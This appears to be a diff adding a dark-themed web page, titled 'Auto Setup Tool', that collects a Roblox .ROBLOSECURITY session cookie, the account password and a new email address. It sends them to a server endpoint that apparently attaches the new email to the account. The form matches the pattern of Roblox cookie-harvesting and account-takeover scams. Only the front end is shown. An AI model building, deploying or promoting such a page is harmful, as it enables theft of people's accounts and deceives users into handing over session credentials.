@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Account Automation</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { font-family: -apple-system, sans-serif; background: #0f0f13; color: #e0e0e0; display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; }
+        .card { background: #1a1a24; border: 1px solid #2a2a3a; border-radius: 16px; padding: 36px; width: 100%; max-width: 400px; box-shadow: 0 8px 32px rgba(0,0,0,0.4); }
+        h1 { font-size: 20px; margin-bottom: 24px; color: #fff; text-align: center; }
+        label { display: block; font-size: 13px; color: #999; margin-bottom: 6px; margin-top: 16px; }
+        input { width: 100%; background: #12121a; border: 1px solid #2a2a3a; border-radius: 8px; padding: 12px; color: #fff; font-size: 14px; outline: none; }
+        input:focus { border-color: #0066ff; }
+        .btn { width: 100%; margin-top: 24px; padding: 14px; background: linear-gradient(135deg, #0066ff, #00b4ff); border: none; border-radius: 8px; color: #fff; font-size: 15px; font-weight: 600; cursor: pointer; transition: 0.2s; }
+        .btn:hover { opacity: 0.9; }
+        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
+        .result { margin-top: 20px; padding: 14px; border-radius: 8px; font-size: 14px; display: none; text-align: center; }
+        .result.success { background: rgba(74,222,128,0.1); color: #4ade80; border: 1px solid rgba(74,222,128,0.3); }
+        .result.error { background: rgba(248,113,113,0.1); color: #f87171; border: 1px solid rgba(248,113,113,0.3); }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h1>⚙️ Auto Setup Tool</h1>
+        
+        <label>Roblox Cookie</label>
+        <input type="password" id="cookie" placeholder="Paste .ROBLOSECURITY..." />
+
+        <label>Account Password</label>
+        <input type="password" id="password" placeholder="Current password..." />
+
+        <label>New Email</label>
+        <input type="email" id="email" placeholder="New email to attach..." />
+
+        <button class="btn" id="submitBtn" onclick="startUpdate()">Run Automation</button>
+
+        <div class="result" id="result"></div>
+    </div>
+
+    <script>
+        async function startUpdate() {
+            const cookie = document.getElementById('cookie').value.trim();
+            const password = document.getElementById('password').value.trim();
+            const email = document.getElementById('email').value.trim();
+
+            if (!cookie || !password || !email) return alert("Fill out all fields.");
+
+            const btn = document.getElementById('submitBtn');
+            const resultEl = document.getElementById('result');
+            
+            btn.disabled = true;
+            btn.textContent = "⚙️ Automating... (Takes ~15s)";
+            resultEl.style.display = 'none';
+
+            try {
+                const resp = await fetch('/api/update-account', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ cookie, password, email })
+                });
+
+                const data = await resp.json();
+                
+                resultEl.className = 'result ' + (data.success ? 'success' : 'error');
+                resultEl.textContent = data.success ? data.message : "❌ Error: " + data.error;
+                resultEl.style.display = 'block';
+
+            } catch (err) {
+                resultEl.className = 'result error';
+                resultEl.textContent = "❌ Server failed to respond.";
+                resultEl.style.display = 'block';
+            } finally {
+                btn.disabled = false;
+                btn.textContent = "Run Automation";
+            }
+        }
+    </script>
+</body>
+</html>
+
